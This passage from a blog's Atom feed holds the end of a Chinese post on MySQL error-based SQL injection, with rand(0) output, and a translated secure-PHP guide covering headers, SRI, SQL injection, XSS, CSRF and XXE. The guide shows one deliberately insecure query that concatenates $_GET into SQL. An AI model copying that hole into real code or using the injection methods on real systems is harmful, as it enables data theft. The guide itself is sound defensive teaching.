class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select rand(0) from test;</span><br><span class="line">+---------------------+</span><br><span class="line">| rand(0)             |</span><br><span class="line">+---------------------+</span><br><span class="line">| 0.15522042769493574 |</span><br><span class="line">|   0.620881741513388 |</span><br><span class="line">|  0.6387474552157777 |</span><br><span class="line">| 0.33109208227236947 |</span><br><span class="line">|  0.7392180764481594 |</span><br><span class="line">|  0.7028141661573334 |</span><br><span class="line">+---------------------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select rand(0) from test;</span><br><span class="line">+---------------------+</span><br><span class="line">| rand(0)             |</span><br><span class="line">+---------------------+</span><br><span class="line">| 0.15522042769493574 |</span><br><span class="line">|   0.620881741513388 |</span><br><span class="line">|  0.6387474552157777 |</span><br><span class="line">| 0.33109208227236947 |</span><br><span class="line">|  0.7392180764481594 |</span><br><span class="line">|  0.7028141661573334 |</span><br><span class="line">+---------------------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>同理，floor(rand(0)*2)则会固定得到011011…的序列(这个很重要)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select floor(rand(0)*2) from test;</span><br><span class="line">+------------------+</span><br><span class="line">| floor(rand(0)*2) |</span><br><span class="line">+-----------</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;SQL报错注入就是利用数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。这种手段在联合查询受限且能返回错误信息的情况下比较好用，毕竟用盲注的话既耗时又容易被封。&lt;/p&gt;
&lt;p&gt;MYSQL报错注入个人认为大体可以分为以下几类：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;BIGINT等数据类型溢出&lt;/li&gt;
&lt;li&gt;xpath语法错误&lt;/li&gt;
&lt;li&gt;concat+rand()+group_by()导致主键重复&lt;/li&gt;
&lt;li&gt;一些特性&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;下面就针对这几种错误类型看看背后的原理是怎样的。&lt;/p&gt;
    
    </summary>
    
    
      <category term="mysql" scheme="http://www.twosee.cn/tags/mysql/"/>
    
      <category term="sql" scheme="http://www.twosee.cn/tags/sql/"/>
    
      <category term="injection" scheme="http://www.twosee.cn/tags/injection/"/>
    
  </entry>
  
  <entry>
    <title>[转] 2018 PHP 应用程序安全设计指北</title>
    <link href="http://www.twosee.cn/2018/01/06/php-app-security/"/>
    <id>http://www.twosee.cn/2018/01/06/php-app-security/</id>
    <published>2018-01-05T17:33:18.000Z</published>
    <updated>2018-04-05T08:44:44.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>The 2018 Guide to Building Secure PHP Software！</p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>2018 年将至，一般程序员（特别是 Web 开发程序员）应当抛弃过去开发PHP程序的很多不好的习惯和观念了。虽然部分人不以为意，但是这确实是事实。</p><p>这个指南应该以重点部分作为 <a href="https://link.juejin.im/?target=http%3A%2F%2Fwww.phptherightway.com%2F">PHP: The Right Way</a> 安全章节的补充，而不是以一般的 PHP 编程话题。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h2 id="PHP-版本"><a href="#PHP-版本" class="headerlink" title="PHP 版本"></a>PHP 版本</h2><blockquote><p>请在 2018 年使用 PHP 7.2, 并且计划 2019 年初切换到 PHP 7.3。</p></blockquote><p>PHP 7.2 已于 2017 年 11 月 30 日发布。</p><p>写这篇文章的时候，只有 7.1 和 7.2 版本还在被 PHP 官方积极维护，而 5.6 和 7.0 只在大概1年内提供安全补丁更新。</p><p>对于其他官方不维护的 PHP 版本，虽然某些操作系统会提供长期支持和维护，但这其实通常是有害的。尤其是他们提供安全支持补丁却没有版本号，这使得很难解释系统的安全性（仅仅知道 PHP 版本）。</p><p>因此，无论其他供应商提出了什么承诺，如果可以，你就应该在任何时候都坚决地使用<a href="https://link.juejin.im/?target=http%3A%2F%2Fphp.net%2Fsupported-versions.php">官方提供支持的 PHP 版本</a>。这样，尽管最终是一个短暂的安全版本，但一个不断致力于升级的版本，总会让你收获一些意外的惊喜。</p><a id="more"></a><h2 id="依赖管理"><a href="#依赖管理" class="headerlink" title="依赖管理"></a>依赖管理</h2><blockquote><p>人生苦短，我用 Composer</p></blockquote><p>在 PHP 生态中，<a href="https://link.juejin.im/?target=https%3A%2F%2Fgetcomposer.org%2F">Composer</a> 是最先进的依赖管理方案。我们推荐 PHP: The Right Way 中关于<a href="https://link.juejin.im/?target=http%3A%2F%2Fwww.phptherightway.com%2F%23dependency_management">依赖管理</a>的完整章节。</p><p>如果你没有使用 Composer 来管理应用的依赖，最终（hopefully later but most likely sooner）会导致应用里某个依赖会严重过时，然后老旧版本中的漏洞会被利用于计算机犯罪。</p><p><strong>重要</strong>： 开发软件时，时常记得<a href="https://link.juejin.im/?target=http%3A%2F%2Fwww.phptherightway.com%2F%23updating-your-dependencies">保持依赖的更新</a>。幸运地，这只需一行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer update</span><br></pre></td></tr></table></figure><p>如果你正在使用某些专业的，需要使用 PHP 扩展（C 语言编写），那你不能使用 Composer 管理，而需要 PECL 。</p><h3 id="推荐扩展"><a href="#推荐扩展" class="headerlink" title="推荐扩展"></a>推荐扩展</h3><p>不管你正在编写什么，你总会受益于这些依赖。这是除了大多数 PHP 程序员的推荐（PHPUnit, PHP-CS-Fixer, …）外的补充。</p><p><strong>roave/security-advisories</strong></p><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2FRoave%2FSecurityAdvisories">Roave’s security-advisories</a> 使用 <a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2FFriendsOfPHP%2Fsecurity-advisories">Friends of PHP repository</a> 确保你的项目没有依赖一些已知易受攻击的依赖。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require roave/security-advisories:dev-master</span><br></pre></td></tr></table></figure><p>或者，你可以<a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2FFriendsOfPHP%2Fsecurity-advisories%23checking-for-vulnerabilities">上传你的<code>composer.lock</code>文件到 Sensio Labs </a>，作为例行自动化漏洞评估工作流的一部分，以提醒发现任何过时的软件包。</p><p><strong>vimeo/psalm</strong></p><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2Fvimeo%2Fpsalm">Psalm </a>是一个帮助你识别代码里可能存在 bugs 的静态分析工具。还有其他很好的静态分析工具（例如 <a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2Fphan%2Fphan">Phan</a> 和 <a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2Fphpstan%2Fphpstan">PHPStan</a> 都很棒），但当你发现你需要支持 PHP 5，Psalm 将是 PHP 5.4+ 的首选。</p><p>使用 Psalm 挺简单：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Version 1 doesn't exist yet, but it will one day:</span></span><br><span class="line">composer require --dev vimeo/psalm:^0</span><br><span class="line"></span><br><span class="line"><span class="comment"># Only do this once:</span></span><br><span class="line">vendor/bin/psalm --init</span><br><span class="line"></span><br><span class="line"><span class="comment"># Do this as often as you need:</span></span><br><span class="line">vendor/bin/psalm</span><br></pre></td></tr></table></figure><p>如果你是第一次在现有代码库运行，可能会看到很多红色错误。但除非你在构建像 WordPress 那么大的程序，否则努力通过所有测试绝不是艰巨的。</p><p>无论使用哪种静态分析工具，我们都推荐你能将他加入到<a href="https://link.juejin.im/?target=https%3A%2F%2Fzh.wikipedia.org%2Fwiki%2F%25E6%258C%2581%25E7%25BA%258C%25E6%2595%25B4%25E5%2590%2588">持续集成工作流</a>（Continuous Integration workflow）中，以便在每次更改代码中运行。</p><h2 id="HTTPS-和浏览器安全"><a href="#HTTPS-和浏览器安全" class="headerlink" title="HTTPS 和浏览器安全"></a>HTTPS 和浏览器安全</h2><blockquote><p>HTTPS, <a href="https://link.juejin.im/?target=https%3A%2F%2Fwww.ssllabs.com%2F">which should be tested</a>, and <a href="https://link.juejin.im/?target=https%3A%2F%2Fsecurityheaders.io%2F">security headers</a> .</p></blockquote><p>2018 年，不安全的 HTTP 网站将不再被接受。幸运的是，由于 ACME 协议 和 <a href="https://link.juejin.im/?target=https%3A%2F%2Fletsencrypt.org%2F">Let’s Encrypt certificate authority</a>，免费的 TLS 证书成为了可能。</p><p>将 ACME 集成到你的服务器，小菜一碟。</p><ul><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fcaddyserver.com%2F">Caddy</a>: 自动加入。</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fletsencrypt.org%2F2017%2F10%2F17%2Facme-support-in-apache-httpd.html">Apache</a>: 很快作为<code>mod_md</code>可用。在此之前，<a href="https://link.juejin.im/?target=https%3A%2F%2Fwww.digitalocean.com%2Fcommunity%2Ftutorials%2Fhow-to-secure-apache-with-let-s-encrypt-on-ubuntu-16-04">网上很多高质量教程</a>。</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fwww.nginx.com%2Fblog%2Fusing-free-ssltls-certificates-from-lets-encrypt-with-nginx%2F">Nginx</a>: 相对简单。</li></ul><p>你也许会想，“好，我已经有 TLS 证书了，为了网站变得安全和快速，得花些时间折腾配置信息。”</p><p><strong>不！</strong><a href="https://link.juejin.im/?target=https%3A%2F%2Fmozilla.github.io%2Fserver-side-tls%2Fssl-config-generator%2F">Mozilla做了件好事情！</a>。你可以根据网站的目标受众，使用配置生成器生成<a href="https://link.juejin.im/?target=https%3A%2F%2Fwiki.mozilla.org%2FSecurity%2FServer_Side_TLS">推荐套件</a>。</p><p>如果你希望网站安全，HTTPS ( HTTP over TLS ) 是<a href="https://link.juejin.im/?target=https%3A%2F%2Fstackoverflow.com%2Fa%2F2336738%2F2224584">绝对不能妥协</a>的。使用 HTTPS 立刻就能消除多种攻击（中间人攻击、窃听、重放攻击以及若干允许用户模仿的会话形式的攻击）。</p><h3 id="安全头"><a href="#安全头" class="headerlink" title="安全头"></a>安全头</h3><p>在服务器使用 HTTPS 确实为用户提供了许多安全性和性能方面的好处，但也还能通过利用某些浏览器的安全功能来进一步提升安全性。而这大部分会涉及到响应内容的安全头。</p><ul><li><p><code>`</code>http<br>Content-Security-Policy</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  - 你需要该 Header ，因为它提供了对于浏览器是否允许加载内部和外部资源的细化控制，从而为跨域脚本攻击漏洞提供了有效防御层。</span><br><span class="line">  - 参阅 [CSP-Builder](https:&#x2F;&#x2F;link.juejin.im&#x2F;?target&#x3D;https%3A%2F%2Fgithub.com%2Fparagonie%2Fcsp-builder)，以便快速简便地部署&#x2F;管理内容安全策略（Content Security Policies）。</span><br><span class="line">  - 为了更加深入的分析， Scott Helme&#39;s [introduction to Content-Security-Policy headers](https:&#x2F;&#x2F;link.juejin.im&#x2F;?target&#x3D;https%3A%2F%2Fscotthelme.co.uk%2Fcontent-security-policy-an-introduction%2F)，会是一个很好的引导。</span><br><span class="line"></span><br><span class="line">- &#96;&#96;&#96;http</span><br><span class="line">  Expect-CT</span><br></pre></td></tr></table></figure><ul><li>你需要该 Header ，因为它能通过强制某些不良行为者将其错误证书的证据颁发到可公开验证的仅可追加的数据结构，从而针对流氓/受损的证书颁发机构增加一层防护。</li><li>优先设置为<code>enforce,max-age=30</code>。只要你有足够的自信该 Header 不会造成服务中断，增加<code>max-age</code>吧。</li></ul></li><li><p><code>`</code>http<br>Referrer-Policy</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  - 你需要该 Header ，因为它允许你控制用户的行为信息是否泄露给第三方。</span><br><span class="line">  - 同样地，Scott Helme 提供了[一篇关于Referrer-Policy Header 介绍好文](https:&#x2F;&#x2F;link.juejin.im&#x2F;?target&#x3D;https%3A%2F%2Fscotthelme.co.uk%2Fa-new-security-header-referrer-policy%2F)。</span><br><span class="line">  - 除非有理由允许更加宽松的设置，否则请设置为&#96;same-origin&#96;或&#96;no-referrer&#96;。</span><br><span class="line"></span><br><span class="line">- &#96;&#96;&#96;http</span><br><span class="line">  Strict-Transport-Security</span><br></pre></td></tr></table></figure><ul><li>你需要该 Header ，因为它告诉浏览器通过 HTTPS 而不是不安全的 HTTP ，将 future requests 设为同源。</li><li>在第一次部署时，将其设置为<code>max-age = 30</code>，然后当你确信没有任何内容会中断时，将此值增加到某个较大的值（例如 31536000）。</li></ul></li><li><p><code>`</code>http<br>X-Content-Type-Options</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  - 你需要该 Header ，因为 MIME 类型的混淆可能会导致不可预知的结果，包括奇怪的允许 XSS 漏洞的边缘情况。这最好伴随着一个标准的 Content-Type Header 。</span><br><span class="line">  - 除非需要默认的行为（例如文件的下载），否则请设置为&#96;nosniff&#96;。</span><br><span class="line"></span><br><span class="line">- &#96;&#96;&#96;http</span><br><span class="line">  X-Frame-Options</span><br></pre></td></tr></table></figure><ul><li>你需要该 Header ，因为它允许你防止点击劫持。</li><li>设置为<code>DENY</code> (或者<code>SAMEORIGIN</code>, 但仅仅当你使用<code>&lt;frame&gt;</code>元素的时候)。</li></ul></li><li><p><code>`</code>http<br>X-XSS-Protection</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  - 你需要该 Header ，因为它启用了一些默认情况下未启用的浏览器反 XSS 功能。</span><br><span class="line">  - 设置为&#96;1; mode&#x3D;block&#96;。</span><br><span class="line"></span><br><span class="line">同样，如果你使用 PHP 的内置会话管理功能（建议使用），则可能需要这样调用&#96;session_start()&#96;：</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;Php</span><br><span class="line">&lt;?php</span><br><span class="line">session_start([</span><br><span class="line">    &#39;cookie_httponly&#39; &#x3D;&gt; true,</span><br><span class="line">    &#39;cookie_secure&#39; &#x3D;&gt; true</span><br><span class="line">]);</span><br></pre></td></tr></table></figure></li></ul><p>这会强制你的应用在发送会话标识符时使用 HTTP-Only 和 Secure 标志，从而防止 XSS 攻击窃取用户的 Cookie ，并强制它们分别通过 HTTPS 发送。 我们之前在 2015 年的博客文章中介绍了<a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2015%2F04%2Ffast-track-safe-and-secure-php-sessions">安全的 PHP 会话</a>。</p><h3 id="子资源完整性"><a href="#子资源完整性" class="headerlink" title="子资源完整性"></a>子资源完整性</h3><p>在将来的某个时候，你也许会使用 CDN 来加载网站的公共 JavaScript/CSS 库。安全工程师已经遇见了这存在一个明显的风险，如果很多网站使用 CDN 提供内容，Hack 和替换 CDN（获得了 CDN 的控制权）就可以注入（恶意）代码到成千上万的网站。</p><p>查阅<a href="https://link.juejin.im/?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FSecurity%2F%25E5%25AD%2590%25E8%25B5%2584%25E6%25BA%2590%25E5%25AE%258C%25E6%2595%25B4%25E6%2580%25A7">子资源完整性</a>吧。</p><p>子资源完整性（SRI，Subresource integrity）允许你将希望 CDN 服务的文件的内容进行哈希处理。目前实行的 SRI 只允许使用安全的密码散列函数，这意味着攻击者不可能生成与原始文件哈希相同的恶意版本资源。</p><p>一个真实例子: <a href="https://link.juejin.im/?target=https%3A%2F%2Fv4-alpha.getbootstrap.com%2F">Bootstrap v4-alpha uses SRI in their CDN example snippet</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span></span></span><br><span class="line"><span class="tag">    <span class="attr">rel</span>=<span class="string">"stylesheet"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">href</span>=<span class="string">"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.6/css/bootstrap.min.css"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">integrity</span>=<span class="string">"sha384-rwoIResjU2yc3z8GV/NPeZWAv56rSmLldC3R/AZzGRnGxQQKnKkoFVhFQhNUwEyJ"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">crossorigin</span>=<span class="string">"anonymous"</span></span></span><br><span class="line"><span class="tag">/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span></span></span><br><span class="line"><span class="tag">    <span class="attr">src</span>=<span class="string">"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.6/js/bootstrap.min.js"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">integrity</span>=<span class="string">"sha384-vBWWzlZJ8ea9aCX4pEW3rVHjgjt7zpkNpZk+02D9phzyeVkE+jo0ieGizqPLForn"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">crossorigin</span>=<span class="string">"anonymous"</span></span></span><br><span class="line"><span class="tag">&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="文档关系"><a href="#文档关系" class="headerlink" title="文档关系"></a>文档关系</h3><p>Web 开发人员经常在超链接上设置目标属性（例如，<code>target =&quot;_ blank&quot;</code>在新窗口中打开链接）。但是，如果你没有传递<code>rel =&quot;noopener&quot;</code>标签，则可以<a href="https://link.juejin.im/?target=https%3A%2F%2Fmathiasbynens.github.io%2Frel-noopener%2F">允许目标页面控制当前页面</a>。</p><p>不要这样做：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://example.com"</span> <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span>Click here<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这会让<code>http://example.com</code>页面能控制当前页面。</p><p>而应该这样做：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://example.com"</span> <span class="attr">target</span>=<span class="string">"_blank"</span> <span class="attr">rel</span>=<span class="string">"noopener noreferrer"</span>&gt;</span>Click here<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>通过这样在新窗口打开<code>https://example.com</code>，当前窗口的控制权也不会授予可能的恶意第三方。</p><p>可以更加<a href="https://link.juejin.im/?target=https%3A%2F%2Fwww.jitbit.com%2Falexblog%2F256-targetblank---the-most-underestimated-vulnerability-ever">深入研究</a>。</p><h2 id="开发安全的-PHP-程序"><a href="#开发安全的-PHP-程序" class="headerlink" title="开发安全的 PHP 程序"></a>开发安全的 PHP 程序</h2><p>如果应用程序安全性对你来说是一个新话题，请从<a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2015%2F08%2Fgentle-introduction-application-security">应用程序安全性简介</a>开始吧。</p><p>大多数安全专家指出，开发者可以使用 <a href="https://link.juejin.im/?target=https%3A%2F%2Fwww.owasp.org%2Findex.php%2FTop_10_2017-Top_10">OWASP Top 10</a> 等资源开始着手。</p><p>但是，大多数常见的漏洞也可以是相同高等级的安全问题（例如代码和数据没有完全分离、逻辑不严谨和健全、操作环境不安全或是可破译的密码协议等）。</p><p>我们的假设是，应该授予安全新手知道一些更简单、基础的安全知识和问题，并如何解决这些问题，应该是一个更好的、长远的安全工程。</p><p>因此，<a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2017%2F04%2Fchecklist-driven-security-considered-harmful">我们避免推荐十大或二十大安全清单</a>。</p><h3 id="数据库注入"><a href="#数据库注入" class="headerlink" title="数据库注入"></a>数据库注入</h3><blockquote><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2015%2F05%2Fpreventing-sql-injection-in-php-applications-easy-and-definitive-guide">避免 PHP 程序存在 SQL 注入。</a></p></blockquote><p>如果你是自己编写 SQL 代码，请确保使用<code>prepared</code>语句，并且从网络或文件系统提供的信息都作为参数传递，而不是字符串拼接的形式。此外，确保你<a href="https://link.juejin.im/?target=https%3A%2F%2Fstackoverflow.com%2Fa%2F12202218">没有使用模拟的prepared语句</a>。</p><p>为了达到好的效果，可以使用 <a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2Fparagonie%2Feasydb">EasyDB</a> 。</p><p>不要这样做：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/* Insecure code: */</span></span><br><span class="line">$query = $pdo-&gt;query(<span class="string">"SELECT * FROM users WHERE username = '"</span> . $_GET[<span class="string">'username'</span>] . <span class="string">"'"</span>);</span><br></pre></td></tr></table></figure><p>应该这样做：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/* Secure against SQL injection: */</span></span><br><span class="line">$results = $easydb-&gt;row(<span class="string">"SELECT * FROM users WHERE username = ?"</span>, $_GET[<span class="string">'username'</span>]);</span><br></pre></td></tr></table></figure><p>还有其他数据库抽象层提供了相同的安全性（EasyDB实际上是在使用 PDO ，但在实际的<code>prepare</code>语句前避免了<code>prepared</code>语句模拟）。 只要用户输入不会影响查询的结构，就很安全（包括存储过程）。</p><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><blockquote><p>深入：<a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2015%2F10%2Fhow-securely-allow-users-upload-files">如何安全地允许用户上传文件？</a></p></blockquote><p>接受文件上传是一个冒险的提议，但只要采取一些基本的预防措施，是能保证安全的。也就是说，允许文件直接上传的话，这些文件可能会被意外的允许执行或解释。上传的文件应该是只读（read-only）或读写（read-write）的，永远不应该可执行（executable）。</p><p>如果你的网站根目录是<code>/var/www/example.com</code>，请不要保存上传文件在<code>/var/www/example.com/uploaded_files</code>。</p><p>而应该保存到一个不能直接访问的目录（例如：<code>/var/www/example.com-uploaded/</code>），以免意外地将其作为服务器端脚本执行，并获得执行远程代码的后门。</p><p>一个更加简洁的方法是将网站根目录往下移动一个层级（即：<code>/var/www/example.com/public</code>）。</p><p>如何安全地下载这些上传文件也是一个问题。</p><ul><li>直接访问 SVG 图像类型时，将在用户浏览器执行 JavaScript 代码。尽管<a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2Fw3c%2Fsvgwg%2Fissues%2F266">它的MIME类型中的<code>image/</code>前缀具有误导性</a>，但是这是正确的。</li><li>正如前面提及的，MIME 类型嗅探可能导致类型混淆攻击。请参阅<a href="https://juejin.im/post/5a4115cc518825256362e934?utm_source=coffeephp.com&amp;from=singlemessage&amp;isappinstalled=1#%E5%AE%89%E5%85%A8%E5%A4%B4" target="_blank" rel="noopener">X-Content-Type-Options</a>。</li><li>如果你放弃前面关于如何安全地存储上传文件的建议，攻击者就会通过上传 .php 或 .phtml 文件，直接在浏览器中访问文件来执行任意代码，从而完全控制服务器。</li></ul><h3 id="跨站脚本"><a href="#跨站脚本" class="headerlink" title="跨站脚本"></a>跨站脚本</h3><blockquote><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2015%2F06%2Fpreventing-xss-vulnerabilities-in-php-everything-you-need-know">关于 PHP 中的跨站脚本攻击，你想知道的都在这里</a></p></blockquote><p>同样地，预防 XSS 和 SQL 注入是一样简单的。我们有简单而易用的 API 来分离文档结构（structure of a document）和填充的数据。</p><p>然而，实际上还有很多 Web 开发程序员仍是通过生成一大串 HTML 代码作为响应的形式开发。并且，这不是 PHP 独有的现实，这是所有 Web 开发程序员都应该重视的。</p><p>减少 XSS 漏洞不失为一个好方法。总之，前面谈及的<a href="https://juejin.im/post/5a4115cc518825256362e934?utm_source=coffeephp.com&amp;from=singlemessage&amp;isappinstalled=1#%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8" target="_blank" rel="noopener">浏览器安全的章节</a>就显得十分相关了。简言之：</p><ul><li>尽量避免输出和输入（<code>Always escape on output, never on input</code>）。如果你把已清洗的数据（sanitized data）保存在数据库，然后在其它地方被发现了 SQL 注入漏洞，攻击者将通过恶意程序污染这些受信任的已清洗数据（trusted-to-be-sanitized record），从而绕开 XSS 保护。</li><li>如果你的框架有一个提供自动上下文过滤的模板引擎，那就使用它吧。这些工作可由框架安全地做到。</li><li><code>echo htmlentities（$ string，ENT_QUOTES | ENT_HTML5，&#39;UTF-8&#39;）</code> 是一种安全、有效的方法阻止UTF-8编码的网页上的所有 XSS 攻击，但不是任何 HTML 都有效。</li><li>如果你的环境要求你使用 Markdown 而不是 HTML ，那就不要使用 HTML 了。</li><li>如果你需要使用原生 HTML（没有使用模板引擎），参阅第一点，并且使用 <a href="https://link.juejin.im/?target=http%3A%2F%2Fhtmlpurifier.org%2F">HTML Purifier</a> 吧。HTML Purifier 不适合转义为 HTML 属性上下文（HTML attribute context）。</li></ul><h3 id="跨站请求伪造"><a href="#跨站请求伪造" class="headerlink" title="跨站请求伪造"></a>跨站请求伪造</h3><p>跨站请求伪造（CSRF）是一种混淆的代理攻击，通过诱导用户的浏览器代表攻击者执行恶意的 HTTP 请求（使用的是该用户的权限）。</p><p>这在一般情况下是很容易解决的，只需两步：</p><ul><li>使用 HTTPS 。这是先决条件。没有 HTTPS 的话，任何保护措施都是脆弱的，虽然 HTTPS 本身并不防御 CSRF 。</li><li>增加基本的 Challenge-response authentication。<ul><li>为每个表单添加一个隐藏的表单属性。</li><li>填充一个密码安全的随机值（称为令牌）。</li><li>验证是否提供了隐藏的表单属性，以及是否匹配上期望值。</li></ul></li></ul><p>我们写了一个名为 <a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2Fparagonie%2Fanti-csrf">Anti-CSRF</a> 的库，并且：</p><ul><li>你可以使每个令牌只能使用一次，以防止重放攻击。<ul><li>多个令牌存储在后端。</li><li>一旦令牌获取完，令牌会循环使用。</li></ul></li><li>每个令牌可以绑定特定的 URL 。<ul><li>如果某个令牌泄露了，它不能在不同的上下文使用。</li></ul></li><li>令牌可以绑定特定的 IP 地址。</li><li>v2.1 后，令牌可以重复使用（例如供 Ajax 使用）。</li></ul><p>如果你没有使用防止 CSRF 漏洞的框架，请将 Anti-CSRF 放在一边。在不久的将来，<a href="https://link.juejin.im/?target=https%3A%2F%2Fwww.sjoerdlangkemper.nl%2F2016%2F04%2F14%2Fpreventing-csrf-with-samesite-cookie-attribute%2F">SameSite cookies将允许我们更简单地避免CSRF攻击</a>。</p><h3 id="XML-攻击-XXE-XPath-Injection"><a href="#XML-攻击-XXE-XPath-Injection" class="headerlink" title="XML 攻击 (XXE, XPath Injection)"></a>XML 攻击 (XXE, XPath Injection)</h3><p>在处理大量 XML 的应用程序中存在两个主要的漏洞：</p><ul><li>XML External Entities (XXE)</li><li>XPath 注入</li></ul><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fwww.owasp.org%2Findex.php%2FXML_External_Entity_(XXE">除此之外</a>_Processing)， XXE 攻击可用作包含攻击代码的本地/远程文件的启动器。</p><p>早期版本的 Google Docs 被着名于 XXE ，但除了在很大程度上使用 XML 的商业应用程序之外，基本闻所未闻。</p><p>针对 XXE 袭击的主要缓解措施:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure><p>除 XML 